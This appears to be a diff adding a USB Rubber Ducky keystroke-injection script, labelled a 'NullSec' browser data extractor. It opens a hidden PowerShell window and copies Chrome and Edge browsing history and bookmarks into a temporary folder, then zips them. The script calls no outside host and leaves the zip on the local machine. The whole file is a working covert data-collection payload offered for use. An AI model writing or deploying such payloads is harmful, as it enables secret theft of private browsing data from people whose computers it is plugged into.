@@ -1,0 +1,28 @@
+REM NullSec Browser Data Extractor
+REM Extracts browser history and bookmarks
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+ENTER
+STRING $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+ENTER
+STRING $output = "$env:TEMP\browser_data"
+ENTER
+STRING New-Item -ItemType Directory -Path $output -Force
+ENTER
+STRING Copy-Item "$chrome\History" "$output\chrome_history" -ErrorAction SilentlyContinue
+ENTER
+STRING Copy-Item "$chrome\Bookmarks" "$output\chrome_bookmarks" -ErrorAction SilentlyContinue
+ENTER
+STRING Copy-Item "$edge\History" "$output\edge_history" -ErrorAction SilentlyContinue
+ENTER
+STRING Compress-Archive -Path $output -DestinationPath "$env:TEMP\browser.zip" -Force
+ENTER
+STRING exit
+ENTER
